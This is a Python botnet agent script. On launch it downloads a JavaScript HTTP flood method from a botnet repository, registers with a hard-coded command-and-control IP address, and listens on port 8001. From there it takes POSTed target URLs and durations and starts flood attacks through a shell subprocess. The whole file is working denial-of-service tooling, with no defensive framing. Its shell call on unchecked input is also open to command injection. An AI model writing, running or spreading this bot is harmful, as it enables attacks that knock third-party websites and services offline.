from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import os
import subprocess
try:
    import requests
except:
    os.system('pip3 install requests')
    import requests


############################
HOST = '146.190.128.108:8000'
methods = {'HTTP-RAW':'HTTP-RAW/HTTP-RAW.js'}
############################

def installmethods():
    os.system('wget -P /root/HTTP-RAW -nc https://raw.githubusercontent.com/ServerSideProject/selica-php-botnet/main/methods/HTTP-RAW.js')
    print('Methods Downloaded!')

def attack(attack_url,attack_method, attack_time):
    if attack_method in methods:
        subprocess.Popen(f"node {methods.get(attack_method)} {attack_url} {attack_time}", shell=True)
    else:
        print('Error!')

class RequestHandler(BaseHTTPRequestHandler):
    def _send_response(self, message):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(bytes(json.dumps(message),'utf8'))

    def do_GET(self):
        if self.path =='/':
            self._send_response({'Alive':True})
        elif self.path == '/stop':
            os.system('pkill node')
            self._send_response({'Stop': True})

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = json.loads(self.rfile.read(content_length))
        attack_url = post_data.get('attack_url')
        attack_method = post_data.get('attack_method')
        attack_time = post_data.get('attack_time')
        print(attack_url,attack_method, attack_time)
        if attack_method in methods:
            self._send_response({"Attack":"True"})
            attack(attack_url, attack_method, attack_time)
        else:
            self._send_response({"Attack": "False","Error":"Bad Method"})

def run(server_class=HTTPServer, handler_class=RequestHandler, port=8001):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()

installmethods()
try:
    responce = requests.get(f'http://{HOST}/newbot')
    if responce.status_code == 200:
        print("Connect work!")
        run()
    else:
        print('Cannot connect to main server')
except:
    print('Cannot connect to main server')

